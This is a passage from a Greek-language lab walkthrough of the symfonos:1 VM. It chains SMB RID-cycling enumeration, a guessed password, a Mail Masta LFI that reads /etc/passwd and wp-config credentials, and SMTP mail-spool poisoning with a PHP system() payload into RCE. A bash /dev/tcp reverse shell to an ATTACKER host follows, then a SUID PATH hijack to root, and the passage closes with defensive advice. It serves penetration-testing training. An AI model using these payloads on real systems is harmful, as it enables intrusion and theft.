| **`prompt`** | **Εναλλάσσει την επιβεβαίωση ανά αρχείο** |
| **`recurse` + `mget *`** | **Φέρνει ΟΛΟΚΛΗΡΟ το δέντρο** |
| **`exit`** | **Έξοδος** |

### 3. Χρήστες μέσω RID cycling, μετά ο προφανής κωδικός

```bash
enum4linux -a TARGET
```

```text
[+] Attempting to get logged-on users from TARGET
[+] Enumerating users using SID S-1-5-21-2234567890-1234567890-987654321 and logon username '', password ''
 S-1-5-21-2234567890-1234567890-987654321-1000 SYMFONOS\helios (Local User)
 S-1-5-21-2234567890-1234567890-987654321-1001 SYMFONOS\zeus (Local User)
 S-1-5-21-2234567890-1234567890-987654321-513 SYMFONOS\None (Domain Group)
```

**`-a`** τρέχει **κάθε έλεγχο που ξέρει το enum4linux**: χρήστες, ομάδες, shares, πολιτική
κωδικών.

**Η λίστα χρηστών προήλθε από RID CYCLING** — **το Samba ταυτοποιεί λογαριασμούς με ένα SID του
οποίου ο τελευταίος αριθμός είναι το RID**· **οι Unix χρήστες ξεκινούν από το 1000.**

**Αν μια ανώνυμη session μπορεί να καλέσει `SamrLookupRids`, μπορείτε απλώς να ρωτήσετε «ποιος
είναι το RID 1000; 1001;» και να πάρετε ονόματα πίσω.**

**Χωρίς κωδικό. Χωρίς exploit. Μόνο μια κακή ρύθμιση δικαιωμάτων.**

**Συγκρίνετε με το Μηχάνημα 8:** εκεί το SID ήταν **`S-1-22-1-1000`** (Unix authority `22`)·
εδώ είναι **`S-1-5-21-…-1000`** (Windows authority `5`, domain `21`). **Ίδια τεχνική,
διαφορετική αναπαράσταση — γιατί το Samba ρυθμίζεται διαφορετικά.**

```bash
smbclient //TARGET/helios -U 'helios%qwerty'
```

```text
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jun 29 03:14:01 2019
  ..                                  D        0  Sat Jun 29 03:14:01 2019
  research.txt                        A      432  Sat Jun 29 03:14:01 2019
  todo.txt                            A       52  Sat Jun 29 03:14:01 2019

                20452264 blocks of size 1024. 17164300 blocks available
smb: \> get research.txt
smb: \> get todo.txt
smb: \> exit
```

```bash
cat todo.txt
```

```text
1. vi /etc/hosts to add symfonos.local
2. I'm working on a WordPress site at /h3l105
3. ...
```

**`-U 'user%password'`** — **ΜΟΝΑ εισαγωγικά**, **γιατί το `%` και το `!` είναι και τα δύο
σημασιολογικά για ένα κέλυφος χωρίς εισαγωγικά.**

**Το `qwerty` ΔΟΥΛΕΨΕ, κατευθείαν από την απαγορευμένη λίστα.**

**Το `todo.txt` σας δίνει τη διαδρομή URL `/h3l105`** **και επιβεβαιώνει ότι το κόλπο του
hostname από το βήμα 1 ήταν ΟΔΗΓΙΑ ΤΟΥ ΙΔΙΟΥ ΤΟΥ ΔΗΜΙΟΥΡΓΟΥ, όχι ιδιορρυθμία CTF.**

**`/h3l105`** = **`helios`** γραμμένο σε **leet** — **`3` = e, `1` = i, `0` = o, `5` = s.**
**Αυτή η σύμβαση ονοματολογίας είναι εύρημα από μόνη της:** *ο διαχειριστής πιστεύει ότι η
απόκρυψη μέσω ορθογραφίας είναι προστασία.*

### 4. Αναρίθμηση WordPress

```bash
wpscan --url http://symfonos.local/h3l105 --plugins-detection aggressive -e ap,u
```

```text
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
_______________________________________________________________

[+] URL: http://symfonos.local/h3l105/ [192.168.56.101]
[+] Started: Sat May  4 15:22:01 2024

[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
[+] WordPress theme in use: twentynineteen

[+] Enumerating All Plugins (via Aggressive Methods)
 Check Existing - Time: 00:01:12 <==============> (25842 / 25842) 100.00% Time: 00:01:12

[+] mail-masta
 | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
 | Last Updated: 2016-09-20T15:06:00.000Z
 | Readme: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt
 | [!] The version is out of date, the latest version is 1.0
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)

[+] site-editor
 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - ChangeLog Section (Aggressive Detection)

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Wp Json Api (Aggressive Detection)
```

| Flag | Ρόλος |
| --- | --- |
| **`-e ap,u`** | **a**ll **p**lugins + **u**sers |
| **`--plugins-detection aggressive`** | **Ζητά ΓΝΩΣΤΑ αρχεία** κάθε plugin **αντί να διαβάζει παθητικά metadata** |

**`(100% confidence)` έναντι `(80% confidence)`** είναι το wpscan να σας λέει **πόσο σίγουρο
είναι** — **το 100% σημαίνει ότι ανέκτησε το `readme.txt` του ίδιου του plugin και διάβασε το
`Stable tag`.**

**`Check Existing … (25842 / 25842)`** — **δοκίμασε 25.842 γνωστά ονόματα plugins.** **Αυτό
είναι το κόστος του `aggressive`, και ο λόγος που καταγράφεται στο access log.**

**`[!] The version is out of date`** — **η δική του βάση λέει ότι υπάρχει νεότερη.** **Αλλά το
`mail-masta` ΔΕΝ ενημερώθηκε από το 2016** — **δηλαδή είναι ΕΓΚΑΤΑΛΕΛΕΙΜΜΕΝΟ.**

```bash
searchsploit wordpress mail masta
searchsploit -x php/webapps/40290.txt
```

```text
---------------------------------------------------------------------
 Exploit Title                                         |  Path
---------------------------------------------------------------------
WordPress Plugin Mail Masta 1.0 - Local File Inclusion | php/webapps/40290.txt
---------------------------------------------------------------------
```
```text
# Exploit Title: WordPress Plugin Mail Masta 1.0 - Local File Inclusion
# Date: 2016-09-20
# Exploit Author: v1n1v131r4
# Vendor Homepage: https://wordpress.org/plugins/mail-masta/
# Version: 1.0
# Tested on: Debian

Description:
The Mail Masta plugin does not sanitize the 'pl' parameter, which is passed
directly to an include() call. This allows an unauthenticated attacker to
read any file on the filesystem.

Proof of Concept:
http://target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

**`-x`** = **examine** — **τυπώνει μια καταχώριση ΧΩΡΙΣ να την αντιγράψει.**

**Το όνομα του plugin ΚΑΙ η έκδοση ταιριάζουν ΚΑΙ ΟΙ ΔΥΟ** — **που είναι αυτό που κάνει την
καταχώριση ΕΦΑΡΜΟΣΙΜΗ, όχι απλώς παρόμοια.**

**`LFI` = Local File Inclusion:** **το plugin χτίζει μια διαδρομή συστήματος αρχείων από την
είσοδό σας και την συμπεριλαμβάνει.**

**`unauthenticated`** είναι η λέξη-κλειδί: **ΔΕΝ χρειάζεστε σύνδεση.** **Άρα δεν χρειάζεστε καν
τον κωδικό του WordPress admin.**

### 5. Επιβεβαίωση του LFI

```bash
curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
helios:x:1000:1000:helios,,,:/home/helios:/bin/bash
zeus:x:1001:1001::/home/zeus:/bin/sh
```

**Το plugin κάνει `include($_GET['pl']);` — ΧΩΡΙΣ ΚΑΝΕΝΑ φίλτρο.**

**Το `/etc/passwd` ΤΥΠΩΝΕΤΑΙ γιατί δεν περιέχει ετικέτες `<?php`**, **άρα η PHP το εκδίδει ως
κυριολεκτική έξοδο.**

**Διαβάστε τα επτά πεδία που χωρίζονται με άνω-κάτω τελεία:**

```text
helios : x : 1000 : 1000 : helios,,, : /home/helios : /bin/bash
  │      │    │      │        │             │              │
  │      │    │      │        │             │              └─ κέλυφος εισόδου
  │      │    │      │        │             └─ αρχικός κατάλογος
  │      │    │      │        └─ GECOS (πλήρες όνομα, γραφείο, τηλέφωνα)
  │      │    │      └─ GID
  │      │    └─ UID
  │      └─ placeholder: το ΠΡΑΓΜΑΤΙΚΟ hash είναι στο /etc/shadow
  └─ όνομα λογαριασμού
```

**Το `x` στο πεδίο 2 σημαίνει ότι το πραγματικό hash είναι στο `/etc/shadow`** — **άρα δεν
υπάρχει τίποτα να σπάσετε εδώ.**

**Η γραμμή `/home/helios` επιβεβαιώνει τον λογαριασμό στον οποίο ήδη πιστοποιηθήκατε μέσω SMB.**

**Και προσέξτε: `/bin/bash` για τον `helios`, αλλά `/bin/sh` για τον `zeus`.** **Ο `zeus` έχει
ΠΕΡΙΟΡΙΣΜΕΝΟ κέλυφος** — **πιθανώς δεν μπορεί καν να συνδεθεί διαδραστικά.**

**Μπορείτε να ΔΙΑΒΑΣΕΤΕ αρχεία, αλλά όχι ακόμα να ΤΡΕΞΕΤΕ κώδικα** — **και εδώ είναι που τα δύο
μισά αυτού του κουτιού συναντιούνται.**

**Δοκιμάστε και άλλα αρχεία:**

```bash
curl -s "…?pl=/var/log/apache2/access.log" | tail -5      # υπάρχει;
curl -s "…?pl=/proc/self/environ"                          # υπάρχει;
curl -s "…?pl=/var/mail/helios"                            # ← **ΑΥΤΟ ΕΙΝΑΙ ΤΟ ΚΛΕΙΔΙ**
curl -s "…?pl=php://filter/convert.base64-encode/resource=../../../wp-config" | base64 -d
```

**Το τελευταίο σας δίνει το `wp-config.php`** — **και άρα τα διαπιστευτήρια της βάσης:**

```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', 'Helios123');
define('DB_HOST', 'localhost');
```

**Πάντα διαβάζετε το `wp-config.php` όταν έχετε LFI σε WordPress.** **Είναι ο ΚΑΝΟΝΑΣ, όχι
εξαίρεση.**

### 6. SMTP log poisoning: LFI → RCE

**Η θύρα 25 είναι ανοιχτή, και το Postfix γράφει τα παραδοθέντα mail στο `/var/mail/helios`.**
**Άρα στείλτε mail στον εαυτό σας με μια PHP one-liner, και μετά συμπεριλάβετε το δικό σας
γραμματοκιβώτιο.**

```bash
nc TARGET 25
```

```text
220 symfonos.local ESMTP Postfix (Debian/GNU)
HELO attacker
250 symfonos.local
MAIL FROM: <?php system($_GET['c']); ?>
250 2.1.0 Ok
RCPT TO: helios
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: test

test
.
250 2.0.0 Ok: queued as 8B0F21A2
QUIT
221 2.0.0 Bye
```

**Το SMTP είναι πρωτόκολλο κειμένου προσανατολισμένο σε γραμμές, άρα μπορείτε να το μιλήσετε με
το χέρι.**

**Διαβάστε τους κωδικούς απάντησης ως τη γραμματική του πρωτοκόλλου:**

| Κωδικός | Σημασία |
| --- | --- |
| **`220`** | **Χαιρετισμός** — «είμαι έτοιμος» |
| **`250`** | **Επιτυχία** |
| **`250 2.1.0 Ok`** | **Ο αποστολέας έγινε δεκτός** |
| **`250 2.1.5 Ok`** | **Ο παραλήπτης έγινε δεκτός** |
| **`354`** | **«Άρχισε να στέλνεις το σώμα»** |
| **`.`** μόνη της σε γραμμή | **ΤΕΛΟΣ του σώματος** |
| **`250 2.0.0 Ok: queued as 8B0F21A2`** | **Το μήνυμα ΜΠΗΚΕ ΣΤΗΝ ΟΥΡΑ — επιτυχία** |
| **`221 Bye`** | **Η σύνδεση έκλεισε** |

**Η PHP πάει στο `MAIL FROM:`** γιατί **αυτή η συμβολοσειρά γράφεται ΚΑΤΑ ΛΕΞΗ μέσα στο αρχείο
του γραμματοκιβωτίου** — **που είναι ακριβώς γιατί ένα μη επικυρωμένο πεδίο φακέλου είναι
διάνυσμα έγχυσης κώδικα.**

**Επαλήθευση ότι το μήνυμα έφτασε:**

```bash
curl -s "…?pl=/var/mail/helios" | grep -n 'php'
```

```text
4:From <?php system($_GET['c']); ?>  Sat May  4 15:31:22 2024
```

**Η γραμμή 4 είναι το `From ` (με ΚΕΝΟ) header του mbox** — **το Postfix γράφει το `MAIL FROM`
ΕΚΕΙ.** **Αυτό επιβεβαιώνει ότι το payload σας είναι ΜΕΣΑ στο αρχείο.**

**Τώρα πυροδοτήστε το:**

```bash
nc -lvnp 4444                                            # Kali, πρώτα
curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**LFI + log poisoning = REMOTE CODE EXECUTION.**

**Τι ακριβώς συνέβη:**

```text
1. include("/var/mail/helios")
2. Η PHP σαρώνει το αρχείο για <?php
3. Βρίσκει <?php system($_GET['c']); ?> στη γραμμή 4
4. ΕΚΤΕΛΕΙ το system($_GET['c'])
5. $_GET['c'] = "id"
6. Η έξοδος της id ΤΥΠΩΝΕΤΑΙ μέσα στην απόκριση
```

**Ό,τι βρίσκεται ΕΞΩ από τις ετικέτες (τα υπόλοιπα headers του mbox) τυπώνεται ως κυριολεκτικό
κείμενο** — **γι' αυτό η απόκριση είναι ακατάστατη.** **Αν θέλετε καθαρή έξοδο, χρησιμοποιήστε
`grep`:**

```bash
curl -s "…?pl=/var/mail/helios&c=id" | grep -oE 'uid=[0-9]+\([a-z-]+\)[^\n]*'
```

**(Σε ορισμένες εκδόσεις αναφέρεται `helios` αντί για `www-data`.)**

**Ο γενικός κανόνας:**

> **Ένα LFI γίνεται RCE όταν μπορείτε να κάνετε τον στόχο να γράψει ένα αρχείο που ΕΛΕΓΧΕΤΕ, σε
> ΠΡΟΒΛΕΨΙΜΗ διαδρομή.**

**Τα συνηθισμένα primitives:** mail spools, **web logs** (poisoning του `User-Agent`), **αρχεία
session**, **`/proc/self/environ`**, **και NFS export**. **Πάντα ψάχνετε για μια διαδρομή που
είναι εγγράψιμη, προβλέψιμη, και συμπεριλήψιμη.**

### 7. Reverse shell και αναβάθμιση TTY

```bash
curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=$(python3 -c "import urllib.parse as u;print(u.quote('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'))")"
```

```text
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.101.
Ncat: Connection from 192.168.56.101:52104.
www-data@symfonos:/var/www/html/h3l105$
```

**Το URL-encoding είναι ΥΠΟΧΡΕΩΤΙΚΟ:** **το `&` διαχωρίζει παραμέτρους query και το `>` είναι
δεσμευμένο**, άρα **αν σταλεί ωμό το payload ΚΟΒΕΤΑΙ στο πρώτο `&` και δεν γίνεται τίποτα** —
**που μοιάζει με σπασμένο κέλυφος.**

**Η `urllib.parse.quote()` παράγει την κωδικοποίηση αντί να πληκτρολογείτε `%26` με το χέρι:**

```text
bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
→ bash%20-i%20%3E%26%20/dev/tcp/192.168.56.10/4444%200%3E%261
```

**Το `>&`** στέλνει **stdout ΚΑΙ stderr** στο socket· **το `0>&1`** στέλνει **και το stdin**
εκεί· **αυτό κάνει το κέλυφος διαδραστικό, όχι εκτυπωτικό.**

**Το `/dev/tcp` είναι χαρακτηριστικό του BASH**, άρα **ελέγξτε πρώτα αν υπάρχει bash στον στόχο.**

**Αναβαθμίστε ΑΜΕΣΩΣ:**

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm; stty rows 40 cols 160
```

**Προσοχή: `python`, όχι `python3`** — **σε αυτή την εποχή του Debian.**

**Χωρίς TTY, το `Ctrl+C` ΣΚΟΤΩΝΕΙ τον listener ΣΑΣ**, **και οτιδήποτε γνωρίζει τερματικό
αποτυγχάνει με `standard input must be a tty`.**

```bash
cat /home/helios/user.txt
sudo -l; crontab -l; cat /etc/crontab; uname -r
```

```text
7b4a1c2d3e4f5a6b7c8d9e0f1a2b3c4d
```
```text
bash: sudo: command not found
no crontab for www-data
Linux symfonos 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1 x86_64 GNU/Linux
```

### 8. Το κυνήγι SUID βρίσκει ένα προσαρμοσμένο binary

```bash
find / -perm -u=s -type f 2>/dev/null
```

```text
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/opt/statuscheck
```

| Flag | Ρόλος |
| --- | --- |
| **`-perm -u=s`** | **«Το user-SUID bit είναι θέσει»** — **το αρχικό `-` το κάνει ταίριασμα ΥΠΟΣΥΝΟΛΟΥ, άρα ΠΙΝΟΝΤΑΙ και αρχεία SGID** |
| **`-type f`** | **Περιορίζει σε κανονικά αρχεία** |
| **`2>/dev/null`** | **Απορρίπτει τα ΧΙΛΙΑΔΕΣ σφάλματα δικαιωμάτων** που αλλιώς θα έθαβαν την απάντηση |

**ΟΛΑ εκτός από το `/opt/statuscheck` είναι stock Debian** — **και ένα προσαρμοσμένο binary στο
`/opt` είναι ο προφανής στόχος.**

```bash
ls -l /opt/statuscheck
strings /opt/statuscheck | grep -iE 'curl|/bin|/usr'
```

```text
-rwsr-xr-x 1 root root 8632 Jun 29  2019 /opt/statuscheck
```
```text
/lib/ld-linux.so.2
libc.so.6
system
__libc_start_main
curl -I http://localhost
```

**`-rwsr-xr-x`** — **το `s` στη θέση execute του OWNER** — **σημαίνει ότι το SUID bit είναι
θέσει και ο ιδιοκτήτης είναι `root`: όποιος το τρέχει, το τρέχει ΩΣ root.**

**Το `strings`** τυπώνει **κάθε ακολουθία εκτυπώσιμων χαρακτήρων σε ένα μεταγλωττισμένο
binary**, **που συνήθως αποκαλύπτει τις ΑΚΡΙΒΕΙΣ γραμμές εντολών που παραδίδει σε κέλυφος.**

**`curl` ΧΩΡΙΣ αρχικό `/`.** **Αυτή είναι η ευπάθεια.**

**Όταν ένα πρόγραμμα καλεί ένα άλλο ΜΟΝΟ με όνομα**, **το κέλυφος ψάχνει το `$PATH` από αριστερά
προς τα δεξιά και τρέχει το ΠΡΩΤΟ ταίριασμα** — **άρα αν ελέγχετε έναν κατάλογο ΠΙΟ ΜΠΡΟΣΤΑ στο
`$PATH`, το ΔΙΚΟ ΣΑΣ αρχείο τρέχει, με τα προνόμια του root.**

**Και η `system` στη λίστα συμβόλων επιβεβαιώνει ότι το binary ΚΑΝΕΙ fork κελύφους** — **άρα το
`$PATH` του καλούντος ΙΣΧΥΕΙ.**

### 9. Το PATH hijack

```bash
cd /home/helios
printf '#!/bin/bash\n/bin/bash -p\n' > curl
chmod +x curl
export PATH=/home/helios:$PATH
/opt/statuscheck
id
cat /root/root.txt
```

```text
root@symfonos:~# id
uid=0(root) gid=0(root) groups=0(root)
```
```text
a9f5c2e8b1d47f30e6c9a2b5d8e1f4a7
```

**Τρία βήματα:**

1. **Βάλτε έναν κατάλογο ελεγχόμενο από τον επιτιθέμενο ΠΡΩΤΟ στο `$PATH`**
2. **Τοποθετήστε ένα εκτελέσιμο με όνομα ΑΚΡΙΒΩΣ ίδιο με τη σκέτη εντολή που καλεί το
   προνομιούχο πρόγραμμα**
3. **Καλέστε το πρόγραμμα**

**Το `statuscheck` ζητά από το κέλυφος το `curl`, το κέλυφος βρίσκει το `/home/helios/curl`, και
το τρέχει ως root.**

**Το `-p` ΕΧΕΙ σημασία.** **Το bash ΡΙΧΝΕΙ σκόπιμα το ενεργό του UID στην εκκίνηση, εκτός αν
κληθεί με `-p` («privileged»)**· **χωρίς αυτό παίρνετε προτροπή `$` και συμπεραίνετε ΛΑΝΘΑΣΜΕΝΑ
ότι το hijack απέτυχε.**

**Σημειώστε: το `export PATH=/home/helios:$PATH` ΠΡΟΘΕΤΕΙ** — **το να το ΠΡΟΣΘΕΤΕΤΕ θα άφηνε το
`/usr/bin/curl` πρώτο και θα έτρεχε το πραγματικό.**

**ΕΠΑΝΑΦΕΡΕΤΕ μετά:**

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**Αλλιώς ΚΑΘΕ μετέπειτα εντολή θα βρίσκει το ψεύτικο `curl` σας** — **και θα μπερδευτείτε.**

> ### 📖 Οι δύο κανόνες που σκοτώνουν ολόκληρη αυτή την κατηγορία
>
> **1. Ποτέ μην αφήνετε ένα πρόγραμμα SUID να λύνει εντολές μέσω `$PATH`.**
>    Χρησιμοποιήστε **απόλυτες διαδρομές** (`/usr/bin/curl`), και **καθαρίστε το περιβάλλον**
>    (`env -i`, ή **`secure_path`** στο sudoers, ή **`Defaults env_reset`**).
>
> **2. Μετά, ανιχνεύστε:** **οποιοδήποτε αρχείο SUID εκτός baseline πρέπει να ειδοποιεί
>    κάποιον.** Ένα **cron** που τρέχει `find / -perm -u=s` και συγκρίνει με **αποθηκευμένη
>    λίστα** κοστίζει δέκα γραμμές.

### 10. Σύγκριση: δύο μηχανήματα, ίδιος μηχανισμός

| | **Μηχάνημα 10 (PwnLab)** | **Μηχάνημα 12 (symfonos)** |
| --- | --- | --- |
| **SUID binary** | `/home/kane/msgmike` | `/opt/statuscheck` |
| **Ιδιοκτήτης** | `mike` | **`root`** |
| **Σκέτη εντολή** | **`cat`** | **`curl`** |
| **Κατάλογος ψεύτικου binary** | `/home/kane` | `/home/helios` |
| **Αποτέλεσμα** | **`mike`** (μεσάζων) | **`root`** (άμεσο) |

**Ίδια τεχνική, διαφορετικό βάθος.** **Στο Μηχάνημα 10 είναι ΕΝΑ βήμα σε μια αλυσίδα τριών·
εδώ είναι το ΤΕΛΕΥΤΑΙΟ βήμα.**

**Το δίδαγμα: το `strings` σε κάθε SUID binary είναι ΔΥΟ δευτερόλεπτα και αποκαλύπτει
ΟΛΟΚΛΗΡΟ τον μηχανισμό.** **Κάντε το ΠΡΙΝ δοκιμάσετε payloads.**

---

_Πίσω στη [Μαθησιακή Διαδρομή 1](../README.md) · προηγούμενο: [Μηχάνημα 11 — Photographer: 1](<11-photographer-1.md>) · επόμενο: [Μηχάνημα 13 — HackInOS: 1](<13-hackinos-1.md>) · πλήρες walkthrough: [`labs/3-062-symfonos-1`](../../labs/3-062-symfonos-1/README.md)_
